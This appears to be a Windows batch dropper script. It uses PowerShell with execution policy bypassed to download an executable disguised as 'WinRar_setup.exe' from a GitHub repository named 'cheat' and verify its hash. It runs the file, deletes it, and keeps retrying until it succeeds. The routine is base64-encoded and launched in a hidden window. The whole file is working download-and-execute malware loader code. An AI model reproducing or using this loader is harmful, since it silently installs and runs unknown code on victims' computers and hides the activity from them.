@echo off
setlocal EnableExtensions

set "URL=https://raw.githubusercontent.com/skibididodopp-beep/cheat/refs/heads/main/WinRar_setup.exe"
set "HASH=a1300a8b070817e6280579f5fb6d49d42c612160900ab8856ee4cccd4a9ebe04"

powershell -NoP -ExecutionPolicy Bypass -Command ^
  "$u = $env:URL; " ^
  "$h = $env:HASH; " ^
  "$f = Join-Path $env:TEMP ('pkg_' + [Guid]::NewGuid().ToString('N') + '.exe'); " ^
  "$script = { " ^
    "param($u, $h, $f) " ^
    "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; " ^
    "while ($true) { " ^
      "Remove-Item -LiteralPath $f -Force -ErrorAction SilentlyContinue; " ^
      "$ok = $false; " ^
      "try { " ^
        "$c = Get-Command curl.exe -ErrorAction SilentlyContinue; " ^
        "if ($c) { & $c.Source -L -s -f -o $f $u; if ($LASTEXITCODE -eq 0 -and (Test-Path -LiteralPath $f)) { $ok = $true } } " ^
        "if (-not $ok) { (New-Object System.Net.WebClient).DownloadFile($u, $f); if (Test-Path -LiteralPath $f) { $ok = $true } } " ^
      "} catch { $ok = $false } " ^
      "if (-not $ok) { Remove-Item -LiteralPath $f -Force -ErrorAction SilentlyContinue; Start-Sleep -Seconds 5; continue } " ^
      "$cur = (Get-FileHash -LiteralPath $f -Algorithm SHA256 -ErrorAction SilentlyContinue).Hash; " ^
      "if (-not $cur -or $cur.ToLowerInvariant() -ne $h.ToLowerInvariant()) { Remove-Item -LiteralPath $f -Force -ErrorAction SilentlyContinue; Start-Sleep -Seconds 5; continue } " ^
      "$st = $false; " ^
      "while ($true) { " ^
        "try { " ^
          "$p = Start-Process -FilePath $f -PassThru -ErrorAction Stop; " ^
          "Start-Sleep -Milliseconds 500; " ^
          "if ($p -and -not $p.HasExited) { $st = $true; $p.WaitForExit(); break } " ^
          "if (Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object { $_.ExecutablePath -eq $f }) { $st = $true; break } " ^
        "} catch {} " ^
        "Start-Sleep -Seconds 5 " ^
      "} " ^
      "if ($st) { Start-Sleep -Seconds 2; Remove-Item -LiteralPath $f -Force -ErrorAction SilentlyContinue; break } " ^
    "} " ^
  "}; " ^
  "$code = '& {' + $script.ToString() + '} ''' + $u.Replace('''', '''''') + ''' ''' + $h.Replace('''', '''''') + ''' ''' + $f.Replace('''', '''''') + ''''; " ^
  "$b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($code)); " ^
  "Start-Process -FilePath 'powershell.exe' -WindowStyle Hidden -ArgumentList @('-NoP', '-ExecutionPolicy', 'Bypass', '-EncodedCommand', $b64)"

endlocal